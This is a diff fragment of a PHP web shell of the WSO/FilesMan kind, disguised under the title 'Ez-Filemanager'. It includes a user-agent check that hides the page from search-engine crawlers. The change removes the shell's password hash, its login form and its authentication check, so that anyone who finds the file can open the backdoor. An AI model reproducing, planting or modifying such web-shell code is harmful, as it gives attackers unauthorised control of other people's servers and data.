@@ -3,7 +3,6 @@ $color = "#df5";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
 $default_charset = 'Windows-1251';
-$auth_pass = "9abfae448bc00ea3214033a3086e6539";
 
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
@@ -25,20 +24,12 @@ if(get_magic_quotes_gpc()) {
 	$_POST = WSOstripslashes($_POST);
     $_COOKIE = WSOstripslashes($_COOKIE);
 }
-function wsoLogin() {
-	die("<title>.: Ez-Filemanager :.</title><pre align=center><form method=post><input type=password name=pass placeholder=password style='background-color:whitesmoke;border:1px solid #fff;outline:none;' required><input type=submit name='mypass' value='submit' style='border:none;background-color:#56ad15;color:#fff;cursor:pointer;'></form></pre>");
-}
+
 function WSOsetcookie($k, $v) {
     $_COOKIE[$k] = $v;
     setcookie($k, $v);
 }
-if(!empty($auth_pass)) {
-    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
-        WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
 
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
-        wsoLogin();
-}
 if(strtolower(substr(PHP_OS,0,3)) == "win")
 	$os = 'win';
 else
